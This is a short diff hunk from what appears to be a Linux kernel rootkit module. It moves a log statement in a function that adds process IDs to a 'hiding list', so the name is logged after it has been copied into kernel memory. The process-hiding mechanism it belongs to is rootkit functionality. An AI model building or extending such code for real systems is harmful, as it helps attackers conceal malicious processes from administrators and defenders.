@@ -327,12 +327,12 @@ void add_to_pid_list(const char *name, unsigned int len)
 {
     struct _pid_list *tmp;
 
-    LOG_INFO("adding pid %s to hiding list", name);
-
     tmp = (struct _pid_list*) kmalloc(sizeof(struct _pid_list), GFP_KERNEL);
     tmp->name = (char*) kmalloc(len, GFP_KERNEL);
     memcpy(tmp->name, name, len);
     tmp->name[len-1] = 0;
+
+    LOG_INFO("adding pid %s to hiding list", tmp->name);
 
     list_add(&(tmp->list), &(pid_list.list));
 }
